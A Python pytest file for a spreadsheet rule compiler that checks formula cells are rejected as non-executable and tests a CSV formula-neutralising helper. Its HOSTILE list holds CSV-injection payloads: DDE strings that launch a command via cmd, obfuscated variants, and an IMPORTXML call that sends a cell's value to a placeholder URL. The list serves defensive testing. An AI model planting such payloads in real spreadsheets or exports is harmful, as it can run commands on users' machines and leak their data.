"""Spreadsheet formula cells must never compile to executable writes."""
from __future__ import annotations

import pytest

from services.rule_compiler.compile import compile_rule_workbook
from services.rule_compiler.classify import classify_rule, formula_prefix

HOSTILE = [
    '=HYPERLINK("https://example.invalid","Open")',
    "=cmd|' /C calc'!A0",
    "@SUM(1+1)*cmd|' /C calc'!A0",
    "+1+1",
    "-2+3",
    '=IMPORTXML(CONCAT("http://x/?",A1),"//a")',
    "\t=1+1",
    "\r=1+1",
    '=name*12+HYPERLINK("x")',
    "=salary*12&cmd|' /C calc'!A0",
    "=IF(1,UPPER(name),cmd|' /C calc'!A0)",
    "=salary*12+Sheet2!A1",
    '=UPPER(name)&HYPERLINK("x")',
    "=TRIM(x)+cmd|' /C calc'!A0",
]


def _compile(rule_text: str, *, dest_named: bool, dest_col: str = "email") -> dict:
    dest_cell = f",{dest_col}" if dest_named else ","
    csv = (
        "rule_id,column,destination_column,rule,severity\n"
        f'V001,email{dest_cell},"{rule_text.replace(chr(34), chr(34) * 2)}",ERROR\n'
    ).encode()
    return compile_rule_workbook(
        "r.csv",
        csv,
        source_columns=["email", "salary", "first", "last", "name", "x", "A2"],
        dest_columns=[dest_col] if dest_named else [],
    )


@pytest.mark.parametrize("dest_named", [True, False], ids=["dest", "no-dest"])
@pytest.mark.parametrize("rule_text", HOSTILE)
def test_formula_cell_is_never_executable(rule_text: str, dest_named: bool):
    classified = classify_rule(rule_text)
    assert classified.get("kind") != "lookup", classified
    report = _compile(rule_text, dest_named=dest_named)
    rules = report.get("rules") or []
    assert len(rules) == 1, report
    rule = rules[0]
    assert rule.get("status") == "needs_confirmation", rule
    assert rule.get("kind") != "lookup", rule
    assert not rule.get("enforced_at_execute"), rule
    assert not rule.get("contract"), rule
    assert rule.get("transform") in (None, "none", ""), rule
    assert not (report.get("shape_steps") or []), report
    assert any("not a supported closed form" in str(i) for i in rule.get("issues") or [])


def test_excel_closed_forms_stay_executable():
    for text, kind in [("=UPPER(email)", "case_upper"), ("=TRIM(email)", "trim")]:
        report = _compile(text, dest_named=True)
        rule = (report.get("rules") or [{}])[0]
        assert rule.get("status") == "executable", (text, rule)
        assert rule.get("kind") == kind, (text, rule)


def test_derive_and_concat_positive_controls():
    for text, kind in [
        ("=salary*12", "derive"),
        ("=A2*12", "derive"),
        ('=CONCATENATE(first," ",last)', "concat"),
    ]:
        report = _compile(text, dest_named=True, dest_col="d_" + kind)
        rule = (report.get("rules") or [{}])[0]
        assert rule.get("kind") == kind, (text, rule)
        assert rule.get("status") == "executable", (text, rule)


def test_ampersand_concat_was_never_supported_and_stays_review():
    """``&`` was not a concat form before this fix — it stays in review,
    not quietly upgraded."""
    rule = (_compile('=first&" "&last', dest_named=True).get("rules") or [{}])[0]
    assert rule.get("status") == "needs_confirmation", rule


def test_derive_formula_unchanged():
    report = _compile("=salary*12", dest_named=True)
    rule = (report.get("rules") or [{}])[0]
    assert rule.get("kind") == "derive", rule


def test_dash_bullet_is_not_a_formula():
    assert formula_prefix("- trim spaces") == ""
    assert formula_prefix("-2+3") == "-"
    assert formula_prefix("@SUM(1+1)") == "@"


def test_in_set_accepts_uppercase_codes():
    for text, want in [
        ("Must be one of US, IN, GB", ["US", "IN", "GB"]),
        ("Must be ACTIVE or INACTIVE", ["ACTIVE", "INACTIVE"]),
        ("in (A, B, C)", ["A", "B", "C"]),
        ("A, B or C", ["A", "B", "C"]),
    ]:
        classified = classify_rule(text)
        contract = (classified or {}).get("contract") or {}
        assert contract.get("type") == "in_set", text
        assert contract.get("values") == want, (text, contract)


def test_in_set_ambiguous_sentences_stay_review():
    for text in [
        "Must be valid for the customer or blank",
        "Must be one of the approved codes",
    ]:
        classified = classify_rule(text)
        contract = (classified or {}).get("contract") or {}
        assert contract.get("type") != "in_set", text


def test_neutralize_formula_cell():
    from services.csv_safety import neutralize_formula_cell

    assert neutralize_formula_cell("=1+1") == "'=1+1"
    assert neutralize_formula_cell("@cmd") == "'@cmd"
    assert neutralize_formula_cell("\tx") == "'\tx"
    assert neutralize_formula_cell("normal") == "normal"
    assert neutralize_formula_cell(None) == ""
    assert neutralize_formula_cell(42) == "42"
